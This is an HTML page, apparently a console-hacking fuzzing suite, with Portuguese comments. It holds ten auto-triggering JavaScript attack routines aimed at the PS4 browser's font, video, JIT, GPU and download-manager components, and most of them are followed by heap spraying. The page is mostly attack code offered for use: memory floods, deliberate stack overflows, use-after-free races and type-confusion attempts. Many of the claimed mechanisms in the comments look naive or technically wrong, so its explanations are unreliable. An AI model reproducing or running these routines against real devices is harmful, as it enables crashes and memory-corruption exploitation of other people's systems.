<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v720000: Wiki Vectors</title>

</head>
<body>

<h1>v720000: WIKI VECTORS</h1>

<div class="status" id="msg">
    ALVOS: LIBFONT, AVPLAYER & SANDBOX LIMITS<br>
    CLIQUE -> ALERTA -> OK (CRASH)
</div>

<button onclick="wiki_attack(w51)">51. FontFaceSet Memory Flood</button>

<button onclick="wiki_attack(w52)">52. Video Decoder Parallel Spam</button>

<button onclick="wiki_attack(w53)">53. DOM Tree Recursion Limit</button>

<button onclick="wiki_attack(w54)">54. TypedArray Hole Creation</button>

<button onclick="wiki_attack(w55)">55. Canvas RadialGradient Bomb</button>
<button onclick="wiki_deep(w56)">56. Float64 JIT Confusion</button>

<button onclick="wiki_deep(w57)">57. Shader Compiler Loop</button>

<button onclick="wiki_deep(w58)">58. Video Track Cue UAF</button>

<button onclick="wiki_deep(w59)">59. Download UI vs Revoke</button>

<button onclick="wiki_deep(w60)">60. Canvas CreatePattern Flood</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    let spray = [];

    function wiki_attack(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        vectorFunc(Stage);
    }
function wiki_deep(vectorFunc) {
        Stage.innerHTML = "";
        spray = [];
        vectorFunc(Stage);
    }

    // =================================================================
    // 51. FontFaceSet Memory Flood
    // Alvo: libSceFont.sprx
    // O PS4 tem um gerenciador de fontes separado. Carregar milhares de fontes
    // corrompidas ou válidas pode esgotar o buffer desse módulo específico.
    // =================================================================
    function w51(stage) {
        const d = document.createElement('div');
        d.innerText = "FONT ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ FONT FLOOD ⚠️\nOk = Carregar 10k Fontes.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Tenta registrar milhares de fontes na memória
            // Isso não usa memória JS normal, usa memória do Kernel/Driver
            for(let i=0; i<10000; i++) {
                try {
                    // Fonte base64 inválida, mas força o parser a rodar
                    const f = new FontFace('CrashFont'+i, 'url(data:font/woff;base64,d09GRgABAAAA...)');
                    document.fonts.add(f);
                    f.load().catch(()=>{}); // Ignora erro, o importante é a tentativa de load
                } catch(e){}
            }
            
            d.innerText = "LOADING FONTS...";
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 52. Video Decoder Parallel Spam
    // Alvo: libSceAvPlayer.sprx
    // O PS4 tem hardware limitado para decodificação simultânea (ex: 4 vídeos).
    // Se tentarmos criar 50 players de vídeo ao mesmo tempo, podemos crashar o driver.
    // =================================================================
    function w52(stage) {
        const d = document.createElement('div');
        d.innerText = "AVPLAYER ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ VIDEO SPAM ⚠️\nOk = Criar 50 Decoders.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria 50 elementos de vídeo e tenta carregar ao mesmo tempo
            for(let i=0; i<50; i++) {
                const v = document.createElement('video');
                // URL válida para forçar o driver a iniciar
                // Use um vídeo curto local ou base64 se tiver
                v.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4?" + i;
                v.preload = "auto";
                stage.appendChild(v);
                
                // Força destruição rápida para estressar o teardown do driver
                setTimeout(() => { v.remove(); }, 100 + (i*10));
            }
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 53. DOM Tree Recursion Limit
    // Alvo: WebKit Stack (Sandbox)
    // O PS4 tem um tamanho de pilha (Stack Size) fixo para o navegador.
    // Criar elementos aninhados profundamente deve causar Stack Overflow nativo.
    // =================================================================
    function w53(stage) {
        const d = document.createElement('div');
        d.innerText = "STACK ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ RECURSION ⚠️\nOk = Estourar Pilha.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Tenta criar 10.000 divs um dentro do outro
            // Browsers normais param em ~5.000 com erro. PS4 pode crashar o processo.
            let container = d;
            try {
                for(let i=0; i<20000; i++) {
                    const el = document.createElement('div');
                    container.appendChild(el);
                    container = el;
                }
            } catch(e) {
                // Se der erro de JS, tentamos usar o HTML parser que é C++
                d.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
            }
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 54. TypedArray Hole Creation
    // Alvo: JavaScriptCore (JIT)
    // Uma técnica famosa de exploit no PS4 envolve criar "buracos" em Arrays Tipados
    // para confundir o gerenciador de memória.
    // =================================================================
    function w54(stage) {
        const d = document.createElement('div');
        d.innerText = "MEMORY HOLE";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ TYPED ARRAY ⚠️\nOk = Corrupção de Heap.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria arrays grandes
            const arrays = [];
            for(let i=0; i<100; i++) {
                arrays.push(new Float64Array(10000));
            }
            
            // Tenta definir propriedades não numéricas em arrays numéricos
            // Isso força o motor JS a mudar a estrutura interna do array (Slow mode)
            // Se fizermos isso durante o Fullscreen, pode haver má gestão de memória.
            for(let i=0; i<100; i++) {
                arrays[i].foo = "bar"; // Propriedade ilegal em TypedArray puro
                
                // Neuter (Desanexar buffer) se possível via Worker (simulado aqui)
                try {
                    postMessage(arrays[i].buffer, [arrays[i].buffer]);
                } catch(e){}
            }
            
            spray.push(new Uint32Array(1024*1024).fill(0x41414141));
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 55. Canvas RadialGradient Bomb
    // Alvo: libSceGnm.sprx (GPU)
    // Gradientes radiais complexos são caros para a GPU calcular.
    // Criar um gradiente com milhares de "color stops" pode travar o driver gráfico.
    // =================================================================
    function w55(stage) {
        const c = document.createElement('canvas');
        c.width = 2000; c.height = 2000; // 4K Texture
        const ctx = c.getContext('2d');
        stage.appendChild(c);

        c.onclick = () => {
            window.alert("⚠️ GPU BOMB ⚠️\nOk = Gradiente Infinito.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Cria um gradiente
            const grad = ctx.createRadialGradient(1000, 1000, 10, 1000, 1000, 1000);
            
            // Adiciona milhares de paradas de cor (Color Stops)
            // O driver tem que alocar memória para cada uma
            try {
                for(let i=0; i<5000; i++) {
                    grad.addColorStop(i/5000, (i%2)?"red":"blue");
                }
            } catch(e) {}
            
            ctx.fillStyle = grad;
            
            // Manda desenhar
            ctx.fillRect(0,0,2000,2000);
            
            // E destrói o canvas imediatamente
            c.width = 1;
        };
        setTimeout(() => c.click(), 500);
    }
// =================================================================
    // 56. Float64 JIT Confusion
    // Alvo: JavaScriptCore (JIT)
    // Vulnerabilidade: O PS4 tenta otimizar acesso a arrays de ponto flutuante.
    // Nós criamos um array, entramos em Fullscreen, e corrompemos o tipo
    // do array (mudando para objeto genérico) no meio da operação.
    // =================================================================
    function w56(stage) {
        const d = document.createElement('div');
        d.innerText = "JIT ATTACK";
        stage.appendChild(d);

        d.onclick = () => {
            window.alert("⚠️ TYPE CONFUSION ⚠️\nOk = Quebrar Tipagem.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // 1. Cria array tipado (Fast Path)
            const arr = new Float64Array(1000);
            arr.fill(1.1);

            // 2. AÇÃO DESTRUTIVA
            // Redefine o buffer protótipo enquanto o código ainda roda
            // Isso força o motor a sair do modo otimizado para o modo lento,
            // mas se feito durante o Fullscreen, pode haver descompasso de memória.
            arr.__proto__ = {}; 
            
            // Tenta ler valores agora que a estrutura interna mudou
            const val = arr[0];
            
            // Spray
            spray.push(new ArrayBuffer(1024*1024));
        };
        setTimeout(() => d.click(), 500);
    }

    // =================================================================
    // 57. Shader Compiler Bomb
    // Alvo: libSceGnm.sprx (Graphics Driver)
    // O WebGL compila shaders (GLSL) para binário GNM do PS4.
    // Um shader malicioso pode travar o compilador do driver.
    // =================================================================
    function w57(stage) {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        stage.appendChild(c);

        if(!gl) { stage.innerText = "No WebGL"; return; }

        c.onclick = () => {
            window.alert("⚠️ SHADER BOMB ⚠️\nOk = Compilar Loop Infinito.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // Shader Vertex com complexidade ciclomática extrema
            // O compilador tenta desenrolar loops (unroll).
            const vsSource = `
                attribute vec4 position;
                void main() {
                    float f = 1.0;
                    for(int i=0; i<10000; i++) { // Loop gigante
                        f += sin(float(i));
                    }
                    gl_Position = position * f;
                }
            `;
            
            const shader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(shader, vsSource);
            
            // AÇÃO: Compila o shader enquanto a GPU muda de modo (Fullscreen)
            gl.compileShader(shader);
            
            spray.push(new Uint32Array(5000));
        };
        setTimeout(() => c.click(), 500);
    }

    // =================================================================
    // 58. Video Track Cue UAF
    // Alvo: libSceAvPlayer (Legendas)
    // Manipulação de faixas de texto (legendas/closed captions).
    // Adicionar e remover faixas (Tracks) causa alocação no módulo de vídeo.
    // =================================================================
    function w58(stage) {
        const v = document.createElement('video');
        stage.appendChild(v);

        v.onclick = () => {
            window.alert("⚠️ TRACK RACE ⚠️\nOk = Adicionar/Remover Legenda.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // 1. Adiciona uma faixa de texto
            const track = v.addTextTrack("subtitles", "Crash", "en");
            track.mode = "showing";
            
            // 2. Adiciona Cues (Legendas)
            for(let i=0; i<100; i++) {
                track.addCue(new VTTCue(i, i+1, "TEXT " + i));
            }

            // 3. AÇÃO DESTRUTIVA
            // Remove o elemento de vídeo enquanto o parser de legenda processa os Cues
            v.remove();
            
            // Sobrescreve a memória onde os Cues estavam
            spray.push(new Float64Array(10000).fill(1.234));
        };
        setTimeout(() => v.click(), 500);
    }

    // =================================================================
    // 59. Blob Download UI Race
    // Alvo: PS4 Download Manager (Shell UI)
    // O PS4 intercepta downloads para mostrar notificações do sistema.
    // Tentar baixar um Blob que foi revogado confunde esse interceptador.
    // =================================================================
    function w59(stage) {
        const a = document.createElement('a');
        const blob = new Blob(["CRASH DATA"], {type: 'application/octet-stream'});
        const url = URL.createObjectURL(blob);
        
        a.href = url;
        a.download = "crash.bin";
        a.innerText = "DOWNLOAD ME";
        stage.appendChild(a);

        a.onclick = (e) => {
            // Se for clique automático, previne loop
            if(!e.isTrusted) return; 

            window.alert("⚠️ UI SHELL RACE ⚠️\nOk = Revogar Download.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // 1. O clique (nativo ou simulado abaixo) inicia o download manager
            
            // 2. AÇÃO DESTRUTIVA
            // Revoga a URL imediatamente. O Download Manager do SO tenta ler o blob
            // mas o WebKit já liberou a memória.
            URL.revokeObjectURL(url);
            
            // Remove o link
            a.remove();
            
            spray.push(new Uint32Array(1024*1024));
        };
        
        // Simula clique
        setTimeout(() => a.click(), 500);
    }

    // =================================================================
    // 60. Canvas CreatePattern Flood
    // Alvo: libSceGnm (Texturas repetidas)
    // `createPattern` cria uma textura de repetição na GPU.
    // Fazer isso com um Canvas de tamanho 0 ou inválido é perigoso.
    // =================================================================
    function w60(stage) {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        
        // Canvas fonte (vazio/invisível)
        const src = document.createElement('canvas');
        src.width = 100; src.height = 100;
        
        stage.appendChild(c);

        c.onclick = () => {
            window.alert("⚠️ PATTERN FLOOD ⚠️\nOk = Criar Texturas Inválidas.");
            
            if (stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();

            // AÇÃO DESTRUTIVA
            // Destrói a fonte
            src.width = 0;
            
            // Tenta criar patterns baseados na fonte destruída
            // O driver GPU tenta mapear uma textura 0x0
            try {
                for(let i=0; i<1000; i++) {
                    const p = ctx.createPattern(src, 'repeat');
                    ctx.fillStyle = p;
                    ctx.fillRect(0,0,100,100);
                }
            } catch(e) {}
            
            spray.push(new Float64Array(5000));
        };
        setTimeout(() => c.click(), 500);
    }

</script>
</body>
</html>
